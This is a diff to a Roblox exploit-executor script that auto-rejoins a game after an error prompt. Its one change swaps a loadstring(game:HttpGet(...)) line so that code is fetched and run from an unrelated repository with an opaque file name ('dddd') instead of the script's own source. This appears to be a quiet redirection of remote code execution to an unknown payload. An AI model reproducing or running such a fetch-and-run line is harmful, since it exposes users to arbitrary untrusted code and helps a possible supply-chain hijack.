@@ -22,7 +22,7 @@ game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(func
         spawn(function()
             if writefile and queue and readfile and isfile and delfile then
                 writefile("autorj-lastimsg.rj", game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text)
-                queue([[loadstring(game:HttpGet("https://raw.githubusercontent.com/baechooYT/Just_Stop/main/autorj.lua", true))()]])
+                queue([[loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/test/refs/heads/main/dddd", true))()]])
             end
             game.StarterGui:SetCore("SendNotification",{
                 Title = "Auto Rejoining...",
